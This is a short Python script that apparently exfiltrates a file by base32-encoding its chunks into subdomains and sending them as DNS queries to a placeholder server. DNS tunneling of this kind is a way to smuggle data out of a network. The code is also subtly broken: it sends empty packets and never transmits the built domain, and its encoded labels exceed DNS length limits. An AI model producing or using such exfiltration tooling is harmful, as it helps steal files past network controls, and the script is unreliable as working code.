import socket
import base64

# DNS server details
DNS_SERVER = "your.dns.server.ip"
DNS_PORT = 53

# File to send
file_path = "path/to/your/file.ext"

def chunk_file(file_data, chunk_size=255):
    """Splits the file data into chunks of a given size."""
    return [file_data[i:i + chunk_size] for i in range(0, len(file_data), chunk_size)]

def send_chunk(chunk, sequence_number):
    """Sends a chunk of the file as a DNS query."""
    # Base32 encode the chunk
    encoded_chunk = base64.b32encode(chunk).decode('utf-8')
    
    # Create a DNS query using the encoded chunk
    domain = f"{encoded_chunk}.chunk{sequence_number}.fileupload.yourdomain.com"
    
    # Send the DNS query (this is a basic UDP request)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(b"", (DNS_SERVER, DNS_PORT))

with open(file_path, "rb") as file:
    file_data = file.read()

# Chunk the file into smaller pieces
chunks = chunk_file(file_data)

# Send each chunk as a DNS query
for i, chunk in enumerate(chunks):
    send_chunk(chunk, i)
